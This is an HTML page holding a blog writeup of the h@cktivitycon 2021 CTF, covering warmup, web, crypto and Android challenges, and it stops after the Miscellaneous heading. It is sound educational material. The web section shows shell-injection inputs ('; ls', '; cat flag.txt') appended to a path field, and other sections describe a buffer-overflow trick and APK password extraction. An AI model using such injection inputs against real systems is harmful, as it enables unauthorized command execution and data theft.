@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  
+
+
+
+
+
+  
+  
+  
+    
+    
+  
+
+
+
+
+
+  
+
+
+
+  
+  
+
+<link rel="stylesheet" href="https://pshegger.github.io/main.min.css" />
+  
+<meta name="robots" content="index, follow">
+    <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+  
+
+<title>h@cktivitycon 2021 CTF</title>
+
+
+<meta name="author" content="pshegger">
+
+<meta name="description" content="Writeups and my thoughts about the 2021 h@cktivitycon CTF">
+<link rel="canonical" href="https://pshegger.github.io/posts/hacktivitycon-2021-ctf/">
+<meta property="og:locale" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="h@cktivitycon 2021 CTF">
+<meta property="og:description" content="Writeups and my thoughts about the 2021 h@cktivitycon CTF">
+<meta property="og:url" content="https://pshegger.github.io/posts/hacktivitycon-2021-ctf/">
+<meta property="article:published_time" content="2021-09-20T00:00:00+02:00">
+  <meta property="article:modified_time" content="2021-09-20T00:00:00+02:00">
+  
+
+
+
+
+
+
+  <meta name="twitter:site" content="pshegger">
+
+
+  <meta name="twitter:creator" content="pshegger">
+
+<meta name="twitter:title" content="h@cktivitycon 2021 CTF">
+<meta name="twitter:description" content="Writeups and my thoughts about the 2021 h@cktivitycon CTF">
+
+
+
+  <meta name="twitter:card" content="summary">
+
+
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Person",
+      "@id": "https://pshegger.github.io/#/schema/person/1",
+      "name":  null ,
+      "url": "https://pshegger.github.io/",
+      "image": {
+        "@type": "ImageObject",
+        "@id": "https://pshegger.github.io/#/schema/image/1",
+        "url": "https://pshegger.github.io/\u003cnil\u003e",
+        "width": null ,
+        "height": null ,
+        "caption":  null 
+      }
+    },
+    {
+      "@type": "WebSite",
+      "@id": "https://pshegger.github.io/#/schema/website/1",
+      "url": "https://pshegger.github.io/",
+      "name": "pshegger",
+      "description":  null ,
+      "publisher": {
+        "@id": "https://pshegger.github.io/#/schema/person/1"
+      }
+    },
+    {
+      "@type": "WebPage",
+      "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/",
+      "url": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/",
+      "name": "h@cktivitycon 2021 CTF",
+      "description": "Writeups and my thoughts about the 2021 h@cktivitycon CTF",
+      "isPartOf": {
+        "@id": "https://pshegger.github.io/#/schema/website/1"
+      },
+      "about": {
+        "@id": "https://pshegger.github.io/#/schema/person/1"
+      },
+      "datePublished": "2021-09-20T00:00:00+02:00",
+      "dateModified": "2021-09-20T00:00:00+02:00",
+      "breadcrumb": {
+        "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/#/schema/breadcrumb/1"
+      },
+      "primaryImageOfPage": {
+        "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/#/schema/image/2"
+      },
+      "inLanguage":  null ,
+      "potentialAction": [{
+        "@type": "ReadAction", "target": ["https://pshegger.github.io/posts/hacktivitycon-2021-ctf/"]
+      }]
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/#/schema/breadcrumb/1",
+      "name": "Breadcrumbs",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position":  1 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://pshegger.github.io/",
+          "url": "https://pshegger.github.io/",
+          "name": "Home"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  2 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://pshegger.github.io/posts/",
+          "url": "https://pshegger.github.io/posts/",
+          "name": "Posts"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "item": {
+          "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/"
+          }
+        }]
+    },
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "Article",
+          "@id": "https://pshegger.github.io/#/schema/article/1",
+          "headline": "h@cktivitycon 2021 CTF",
+          "description": "Writeups and my thoughts about the 2021 h@cktivitycon CTF",
+          "isPartOf": {
+            "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/"
+          },
+          "mainEntityOfPage": {
+            "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/"
+          },
+          "datePublished": "2021-09-20T00:00:00+02:00",
+          "dateModified": "2021-09-20T00:00:00+02:00",
+          "author": {
+            "@id": "https://pshegger.github.io/#/schema/person/1"
+          },          
+          "publisher": {
+            "@id": "https://pshegger.github.io/#/schema/person/1"
+          },
+          "image": {
+            "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/#/schema/image/2"
+          }
+        }
+      ]
+    },{
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "ImageObject",
+          "@id": "https://pshegger.github.io/posts/hacktivitycon-2021-ctf/#/schema/image/2",
+          "url":  null ,
+          "contentUrl":  null ,
+          "caption": "h@cktivitycon 2021 CTF"
+        }
+      ]
+    }
+  ]
+}
+</script>
+  
+
+  
+
+</head><body>
+    <header class="container">
+  <nav class="main-nav" id="js-navbar">
+    <a class="logo" href="https://pshegger.github.io/">pshegger</a>
+    <ul class="menu" id="js-menu">
+      
+      
+      
+        <li class="menu-item">
+          <a href="/about/" class="menu-link">About</a>
+        </li>
+      
+      
+      
+        <li class="menu-item">
+          <a href="/posts/" class="menu-link">All Posts</a>
+        </li>
+      
+      
+      
+      <li class="menu-item">
+        <span class="menu-link">Explore<span class="drop-icon">▾</span></span>
+        <ul class="sub-menu">
+          
+            <li class="menu-item">
+              <a href="/categories/" class="menu-link">Categories</a>                  
+            </li>
+          
+            <li class="menu-item">
+              <a href="/tags/" class="menu-link">Tags</a>                  
+            </li>
+          
+            <li class="menu-item">
+              <a href="/series/" class="menu-link">Series</a>                  
+            </li>
+          
+        </ul>
+      </li>
+      
+      
+      <li class="menu-item--align">
+        <div class="switch">
+          <input class="switch-input" type="checkbox" id="themeSwitch">
+          <label aria-hidden="true" class="switch-label" for="themeSwitch">On</label>
+          <div aria-hidden="true" class="switch-marker"></div>
+        </div>
+      </li>
+    </ul>
+    <span class="nav-toggle" id="js-navbar-toggle">
+      <svg xmlns="http://www.w3.org/2000/svg" id="Outline" viewBox="0 0 24 24" width="30" height="30" fill="var(--color-contrast-high)"><rect y="11" width="24" height="2" rx="1"/><rect y="4" width="24" height="2" rx="1"/><rect y="18" width="24" height="2" rx="1"/></svg>
+    </span>
+  </nav>
+</header><main class="section">
+<div class="container">
+  <section class="page-header">
+    <h1 class="page-header-title">h@cktivitycon 2021 CTF</h1>
+    <div class="post-list-meta">
+      <div class="post-list-dates">Sep 20, 2021&nbsp;&middot;&nbsp;15 min.</div>
+      
+      <div class="post-list-categories">
+        
+          <a href="https://pshegger.github.io/categories/ctf/">ctf</a>
+        
+      </div>
+      
+      
+    </div>
+    <p class="page-header-desc">Writeups and my thoughts about the 2021 h@cktivitycon CTF</p>
+    <div class="single-terms">
+      
+      
+      <a class="term" href="https://pshegger.github.io/tags/ctf/">ctf</a></li>
+      
+      <a class="term" href="https://pshegger.github.io/tags/writeup/">writeup</a></li>
+      
+      <a class="term" href="https://pshegger.github.io/tags/hacktivitycon/">hacktivitycon</a></li>
+      
+      <a class="term" href="https://pshegger.github.io/tags/hackerone/">hackerone</a></li>
+      
+      <a class="term" href="https://pshegger.github.io/tags/cryptography/">cryptography</a></li>
+      
+      <a class="term" href="https://pshegger.github.io/tags/python/">python</a></li>
+      
+      
+    </div>
+  </section>
+</div>
+<div class="single-container-post">
+  
+
+  <aside class="toc">
+    <div id="js-toc-toggle">
+      <h2 class="toc-header">Table of Contents</h2>
+      <span class="toc-drop-icon">&blacktriangledown;</span>
+    </div>
+    <div id="js-toc-contents" class="toc-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#warmup">Warmup</a>
+      <ul>
+        <li><a href="#read-the-rules">Read The Rules</a></li>
+        <li><a href="#pimple">Pimple</a></li>
+        <li><a href="#bass64">Bass64</a></li>
+        <li><a href="#tsunami">Tsunami</a></li>
+        <li><a href="#2ez">2ez</a></li>
+        <li><a href="#target-practice">Target Practice</a></li>
+        <li><a href="#six-four-over-two">Six Four Over Two</a></li>
+        <li><a href="#butter-overflow">Butter Overflow</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#confidentiality">Confidentiality</a></li>
+      </ul>
+    </li>
+    <li><a href="#cryptography">Cryptography</a>
+      <ul>
+        <li><a href="#n1tp">N1TP</a></li>
+      </ul>
+    </li>
+    <li><a href="#mobile">Mobile</a>
+      <ul>
+        <li><a href="#to-do">To Do</a></li>
+        <li><a href="#reactor">Reactor</a></li>
+      </ul>
+    </li>
+    <li><a href="#miscellaneous">Miscellaneous</a>
+      <ul>
+        <li><a href="#bad-words">Bad Words</a></li>
+        <li><a href="#shelle">Shelle</a></li>
+        <li><a href="#redlike">Redlike</a></li>
+      </ul>
+    </li>
+    <li><a href="#scripting">Scripting</a>
+      <ul>
+        <li><a href="#words-church">Words Church</a></li>
+        <li><a href="#otp-smasher">OTP Smasher</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusions">Conclusions</a></li>
+  </ul>
+</nav></div>
+  </aside>
+
+  <div class="single-post-contents">
+    <div class="single-feature-img">
+
+
+
+  
+
+</div>
+    <article class="markdown">
+        <p>This year’s <a href="https://www.hackerone.com/hacktivitycon" target="_blank" rel="noopener">h@cktivitycon</a> was held last Saturday, but even before it started, there was another event HackerOne had organized: this year’s CTF. It began on Thursday and ran for 48 hours. As I wasn’t following the events, it was already Friday when I realized it was running. I still had a bit more than a day to complete as many challenges as possible, so I decided to register and see how it goes.</p>
+<p>Even though I already had some experience with CTFs, this was my first time participating in an event while it was running. Previously I only tried the challenges after the event had ended, so there was zero time pressure. I’m also not a security professional, most of the challenges are too hard for me, but I hoped I could find a few that I could solve and enjoy. Luckily there were challenges for every skill level, so I could find the ones suitable for me. Let’s see them.</p>
+<h2 id="warmup">Warmup<a href="#warmup">
+    <svg role="img" aria-labelledby="warmup-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="warmup-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h2><p>It was instantly clear that I should start at the warmup category. These challenges were not too hard, but they were a fun place to begin.</p>
+<h3 id="read-the-rules">Read The Rules<a href="#read-the-rules">
+    <svg role="img" aria-labelledby="read-the-rules-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="read-the-rules-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>This was probably the easiest challenge in the whole event. As the title says, you just had to go to the rules page and find the flag in a comment in the page&rsquo;s source code.</p>
+<h3 id="pimple">Pimple<a href="#pimple">
+    <svg role="img" aria-labelledby="pimple-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="pimple-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>This challenge started by downloading a file with no extension. I did what I usually do when I have a file, and I don’t know what kind of file is: open it in a hex editor. After a glance at the header, I knew that I had an <code>xcf</code> file in front of me, so I added the extension and opened it in GIMP. I had no idea how to continue from this point, so I just started to show/hide the layers. Luckily, this was all I had to do; I found one with the flag after hiding a few of the top layers.</p>
+<h3 id="bass64">Bass64<a href="#bass64">
+    <svg role="img" aria-labelledby="bass64-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="bass64-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>This was also one of the easier challenges. You got a file that turned out to be a simple text file. When I first opened it, it looked like it contained only random characters, but I quickly realized that I had to turn off line wrapping in my text editor to see the content as it was supposed to be seen. After that, I could see the ASCII art for the flag. After reading it, I pasted it into the website, and it was correct.</p>
+<h3 id="tsunami">Tsunami<a href="#tsunami">
+    <svg role="img" aria-labelledby="tsunami-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="tsunami-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>This challenge also started by downloading a file without an extension, so I opened it in a hex editor again. The header proved to be useful again, and it showed that I got a <code>wav</code> file this time. I&rsquo;ve seen this type of challenge before, so I had a strong feeling that the flag was hidden in the file&rsquo;s spectrogram. After finding software capable of displaying it, it confirmed my suspicion, and I found the next flag in no time.</p>
+<h3 id="2ez">2ez<a href="#2ez">
+    <svg role="img" aria-labelledby="2ez-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="2ez-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>This challenge also started with downloading an unknown file, so I started with my hex editor again. The first thing I realized was the <code>JFIF</code> part in the file header, so I knew it was a jpg file. I also realized that the start of the header was weird, so I opened a random jpg file on my machine and checked it too. It quickly became clear that the first 4 bytes were modified, so I edited them to contain the correct value (<code>0xFF 0xD8 0xFF 0xE0</code>). All that remained was to add the correct extension and open it.</p>
+<h3 id="target-practice">Target Practice<a href="#target-practice">
+    <svg role="img" aria-labelledby="target-practice-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="target-practice-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>We also got a file to download for this challenge, but it had a <code>.gif</code> extension this time. When you opened it, you could see concentric circles in the middle and some dots around it. The dots were changing with every frame. I had the suspicion that I was looking at some kind of 2d barcode, but I had to check it. After some googling, I could confirm that I was right, and each frame contained a Maxi Code.</p>
+<p>I wrote a small script to export every frame as a separate file. As the gif contained only 22 frames, I decided to check each one by hand as it would have taken more time to write a script for that. In the end, I found the flag in one of the frames.</p>
+
+
+  <span class="code-language">python</span><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;target_practice.gif&#34;</span>) <span style="color:#66d9ef">as</span> im:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(im<span style="color:#f92672">.</span>n_frames):
+</span></span><span style="display:flex;"><span>        im<span style="color:#f92672">.</span>seek(i)
+</span></span><span style="display:flex;"><span>        im<span style="color:#f92672">.</span>save(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;target_practice/frame</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">.gif&#34;</span>)</span></span></code></pre></div>
+<h3 id="six-four-over-two">Six Four Over Two<a href="#six-four-over-two">
+    <svg role="img" aria-labelledby="six-four-over-two-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="six-four-over-two-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>For this challenge, the solution was hinted at in the title and in the description (<code>cover all the bases</code>). With these hints, I realized that I was looking at a <code>base32</code> encoded text, so I decoded it, and that was all I had to do.</p>
+<h3 id="butter-overflow">Butter Overflow<a href="#butter-overflow">
+    <svg role="img" aria-labelledby="butter-overflow-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="butter-overflow-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>This time the downloadable file was a source code for a small program written in c. After reading it, you could see multiple things:</p>
+<ol>
+<li>the handler for a segfault calls the <code>give_flag</code> method</li>
+<li>the program reads input to a buffer with a length of <code>0x200</code></li>
+<li>the length of the input is not validated</li>
+</ol>
+<p>With the above information, we can quickly realize that all we have to do is cause a buffer overflow with our input, so I generated a long enough string of <code>a</code>s pasted it into the terminal and got the flag.</p>
+<h2 id="web">Web<a href="#web">
+    <svg role="img" aria-labelledby="web-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="web-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h2><h3 id="confidentiality">Confidentiality<a href="#confidentiality">
+    <svg role="img" aria-labelledby="confidentiality-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="confidentiality-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>For this challenge, we were presented with a website with one input field. The site stated that we could pass any path as input, and it would show the files in the given folder. After trying it with the given example, I had the assumption that the site was running <code>ls -l {user_input}</code> and showed the result. This, of course, would mean that we can use shell injection to run any command on the system, and with that, to get the flag.</p>
+<p>I quickly tried <code>; ls</code> as an input, and when I got the current working directory listed twice (first for the original <code>ls -l</code> and a second time for my injected <code>ls</code>), it confirmed my assumption. I also saw a file called <code>flag.txt</code>, so I tried getting its content with <code>; cat flag.txt</code>, which worked, and with that, I had the flag.</p>
+<h2 id="cryptography">Cryptography<a href="#cryptography">
+    <svg role="img" aria-labelledby="cryptography-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="cryptography-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h2><h3 id="n1tp">N1TP<a href="#n1tp">
+    <svg role="img" aria-labelledby="n1tp-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="n1tp-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>After connecting to the service, we got an encrypted string and the opportunity to try the encryption ourselves. After trying it with some random input Nina (the author of the encryption tool) mentions one-time pad. Then I tried another input, but this time instead of an arbitrary string, I used one that had the same format as the flag (<code>flag{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}</code> in this case). Comparing the result to the original encrypted string, I realized that the first 10 character was the same in both texts.</p>
+<p>This made me think that the key is reused for the encryption, so I started to look into attack vectors for this. I quickly found that I could use a technic called <code>Crib Dragging</code>, so I searched for an online version and found <a href="http://cribdrag.com/" target="_blank" rel="noopener">this</a> site. After providing the required and known info, the site quickly decrypted the original encrypted text, and with that, I got another flag.</p>
+<h2 id="mobile">Mobile<a href="#mobile">
+    <svg role="img" aria-labelledby="mobile-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="mobile-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h2><h3 id="to-do">To Do<a href="#to-do">
+    <svg role="img" aria-labelledby="to-do-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="to-do-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>We had to download an <code>apk</code> file for this challenge and extract the flag from that. I started by installing the app on my phone and running it to get a general idea about how it works. After starting the app, I saw a login screen that asked for the password. At this point, I launched <a href="https://github.com/Konloch/bytecode-viewer" target="_blank" rel="noopener">Bytecode Viewer</a> on my computer and opened the apk with it. I navigated to the source of the <code>LoginActivity</code>, and after some reading, I found which class contains the code for checking the password. I opened that file too, and to my surprise, the check was only an if statement with the password in plain text. I went back to the application on my phone and tried the password, and it worked, so I got access to the to-do items stored in the database. The first item was the flag itself, so I submitted it and went on to the next challenge.</p>
+<h3 id="reactor">Reactor<a href="#reactor">
+    <svg role="img" aria-labelledby="reactor-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="reactor-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>After my success with the previous challenge, I felt like I had to try this too, even though this was a medium-difficulty one, and I completed only easy ones so far. I downloaded the apk, installed it, and was presented with a PIN entry screen. When you entered any code, you got a string that changed with the PIN. This meant that the PIN was probably used as a decryption key for the encrypted flag.</p>
+<p>I opened the apk with Bytecode Viewer again, and after finding the <code>MainActivity</code>, I saw that it&rsquo;s a subclass of <code>ReactActivity</code>. This meant that we had a React Native application this time, which was unlucky because I couldn&rsquo;t use my Android knowledge. After some search, I found that the source for the app is in <code>/assets/index.android.bundle</code>. I opened the file, but it was obfuscated, so I took a break before trying to understand it.</p>
+<p>To pass some time while I was gathering strength for understanding the obfuscated code, I tried various random PINs in the app. I quickly realized that the first character of the resulting decrypted text only depends on the first number in the PIN. After that, I checked if the 2nd character is dependent only on the 2nd number of the PIN or not, and it was. That was also true for the 3rd and 4th characters. This meant that I could guess the numbers 1-by-1, and instead of trying all the 10000 possible combinations, I could find the correct PIN in a maximum of 40 tries.</p>
+<p>With that knowledge, I started to search by only changing the first digit of the PIN until the output began with an <code>f</code>. After I got the first digit, I repeated the previous step for digits 2-4 until, in the end, I got the correct PIN, and with that, another flag.</p>
+<h2 id="miscellaneous">Miscellaneous<a href="#miscellaneous">
+    <svg role="img" aria-labelledby="miscellaneous-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="miscellaneous-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
